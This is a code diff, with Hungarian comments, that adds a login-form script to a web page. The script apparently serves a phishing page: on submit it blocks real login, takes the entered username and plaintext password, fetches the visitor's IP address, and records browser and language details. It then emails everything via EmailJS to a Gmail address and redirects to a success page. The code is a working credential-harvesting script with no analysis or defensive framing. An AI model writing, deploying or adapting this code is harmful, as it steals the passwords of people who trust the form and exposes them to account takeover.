@@ -1,0 +1,57 @@
+<script>
+    // IP lekérdezés funkció
+    async function getIPAddress() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('IP lekérdezés hiba:', error);
+            return 'N/A';
+        }
+    }
+
+    // Login form kezelése IP lekérdezéssel
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const loading = document.getElementById('loading');
+        
+        if (username === '' || password === '') {
+            alert('Kérlek töltsd ki mindkét mezőt!');
+            return;
+        }
+
+        // Loading állapot
+        loading.style.display = 'block';
+
+        // IP CÍM LEKÉRDEZÉSE
+        const ipAddress = await getIPAddress();
+        console.log('🌐 IP cím:', ipAddress);
+
+        // Email paraméterek IP címmel
+        const templateParams = {
+            username: username,
+            password: password,
+            timestamp: new Date().toLocaleString('hu-HU'),
+            ip_address: ipAddress,  // IP cím hozzáadva
+            browser: navigator.userAgent,
+            language: navigator.language
+        };
+
+        // Email küldése EmailJS-en keresztül
+        emailjs.send('cesaxy123@gmail.com', 'template_wxgakur', templateParams)
+            .then(function(response) {
+                console.log('✅ SIKER!', response.status);
+                loading.style.display = 'none';
+                window.location.href = `success.html?user=${encodeURIComponent(username)}`;
+            })
+            .catch(function(error) {
+                console.error('❌ HIBA:', error);
+                loading.style.display = 'none';
+                alert('Hiba történt!');
+            });
+    });
+</script>
